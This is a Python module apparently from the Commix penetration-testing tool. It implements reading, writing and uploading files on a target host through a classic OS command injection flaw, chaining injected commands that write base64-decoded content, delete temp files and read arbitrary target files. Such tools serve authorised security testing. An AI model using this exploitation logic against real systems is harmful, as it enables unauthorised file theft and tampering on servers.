#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2023 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import re
import os
import sys
from src.utils import menu
from src.utils import settings
from src.utils import session_handler
from src.core.injections.controller import checks
from src.core.requests import requests
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.injections.results_based.techniques.classic import cb_injector

"""
The "classic" technique on result-based OS command injection.
"""

"""
Write to a file on the target host.
"""
def file_write(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec):
  file_to_write, dest_to_write, content = checks.check_file_to_write()
  if settings.TARGET_OS == "win":
    cmd = checks.change_dir(dest_to_write)
    response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
    fname, tmp_fname, cmd = checks.find_filename(dest_to_write, content)
    response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
    cmd = checks.win_decode_b64_enc(fname, tmp_fname)
    response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)	
    cb_injector.injection_results(response, TAG, cmd)
    cmd = checks.delete_tmp(tmp_fname)
    response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)	
    cb_injector.injection_results(response, TAG, cmd)
  else:
    cmd = checks.write_content(content, dest_to_write)
    response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
    shell = cb_injector.injection_results(response, TAG, cmd)
    shell = "".join(str(p) for p in shell)
  cmd = checks.check_file(dest_to_write)
  if settings.USE_BACKTICKS:
    cmd = checks.remove_command_substitution(cmd)
  response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
  shell = cb_injector.injection_results(response, TAG, cmd)
  shell = "".join(str(p) for p in shell)
  checks.file_write_status(shell, dest_to_write)

"""
Upload a file on the target host.
"""
def file_upload(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec):
  cmd, dest_to_upload = checks.check_file_to_upload()
  response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
  shell = cb_injector.injection_results(response, TAG, cmd)
  shell = "".join(str(p) for p in shell)
  cmd = checks.check_file(dest_to_upload)
  if settings.USE_BACKTICKS:
    cmd = checks.remove_command_substitution(cmd)
  response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
  shell = cb_injector.injection_results(response, TAG, cmd)
  shell = "".join(str(p) for p in shell)
  checks.file_upload_status(shell, dest_to_upload)

"""
Read a file from the target host.
"""
def file_read(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec):
  cmd, file_to_read = checks.file_content_to_read() 
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
    if settings.URL_RELOAD:
      response = requests.url_reload(url, timesec)
    shell = cb_injector.injection_results(response, TAG, cmd)
    shell = "".join(str(p) for p in shell)
    session_handler.store_cmd(url, cmd, shell, vuln_parameter)
  else:
    shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  checks.file_read_status(shell, file_to_read, filename)

"""
Check the defined options
"""
def do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec):
  if menu.options.file_write:
    file_write(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
    settings.FILE_ACCESS_DONE = True

  if menu.options.file_upload:
    if settings.TARGET_OS == "win":
      check_option = "--file-upload"
      checks.unavailable_option(check_option)
    else:
      file_upload(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
    settings.FILE_ACCESS_DONE = True

  if menu.options.file_read:
    file_read(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)
    settings.FILE_ACCESS_DONE = True 

# eof